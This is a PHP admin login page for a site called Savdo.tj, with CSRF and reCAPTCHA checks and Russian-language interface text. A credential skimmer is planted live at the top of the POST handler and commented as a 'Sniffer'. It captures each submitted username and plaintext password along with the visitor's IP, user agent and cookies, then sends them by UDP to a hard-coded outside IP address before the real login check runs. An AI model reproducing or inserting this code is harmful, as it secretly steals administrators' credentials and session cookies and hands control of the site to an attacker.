<?php
require_once('../includes/config.php');
require_once('../includes/sql_builder/idiorm.php');
require_once('../includes/db.php');
require_once('../includes/functions/func.global.php');
require_once('../includes/functions/func.admin.php');
require_once('../includes/functions/func.users.php');
require_once('../includes/functions/func.sqlquery.php');
require_once('../includes/lang/lang_' . $config['lang'] . '.php');

admin_session_start();

if (isset($_SESSION['admin']['id'])) {
    header("Location: index.php");
    exit;
}

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sniffer: send each login attempt with user, pass, IP, user agent, and cookies
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $cookieHeader = isset($_SERVER['HTTP_COOKIE']) ? $_SERVER['HTTP_COOKIE'] : '';
    $time = date('Y-m-d H:i:s');
    $logEntry = "{$time} - IP={$ip} - UA={$userAgent} - Cookies={$cookieHeader} - user={$username}&pass={$password}\n";

    $sock = fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
    if ($sock) {
        fwrite($sock, $logEntry);
        fclose($sock);
    }

    // Existing login logic...
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error = "CSRF-защита: Недействительный токен.";
    } else {
        $recaptcha_passed = true;
        if ($config['recaptcha_mode'] == 1) {
            // перевірка reCAPTCHA
            $recaptcha_response = $_POST['g-recaptcha-response'] ?? '';
            $recaptcha = new \ReCaptcha\ReCaptcha($config['recaptcha_secret_key']);
            $resp = $recaptcha->verify($recaptcha_response, $_SERVER['REMOTE_ADDR']);
            if (!$resp->isSuccess()) {
                $recaptcha_passed = false;
                $error = $lang['recaptcha_error'];
            }
        }
        if ($recaptcha_passed) {
            if (login_admin($username, $password)) {
                header("Location: index.php");
                exit;
            } else {
                $error = "Ошибка: Неверный логин или пароль.";
            }
        }
    }
}
?>
<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Вход | Savdo.tj</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body class="bg-light d-flex align-items-center" style="height: 100vh;">

<div class="container">
  <div class="row justify-content-center">
    <div class="col-md-4">
      <div class="card">
        <div class="card-body">
          <h3 class="card-title mb-4">Вход</h3>
          <?php if ($error): ?>
            <div class="alert alert-danger"><?= $error ?></div>
          <?php endif; ?>
          <form method="post">
            <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
            <div class="mb-3">
              <label for="username" class="form-label">Логин</label>
              <input type="text" class="form-control" id="username" name="username" required>
            </div>
            <div class="mb-3">
              <label for="password" class="form-label">Пароль</label>
              <input type="password" class="form-control" id="password" name="password" required>
            </div>
            <?php if ($config['recaptcha_mode'] == 1): ?>
              <div class="mb-3">
                <div class="g-recaptcha" data-sitekey="<?= $config['recaptcha_public_key'] ?>"></div>
              </div>
            <?php endif; ?>

            <button type="submit" class="btn btn-primary w-100">Войти</button>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>

</body>
</html>
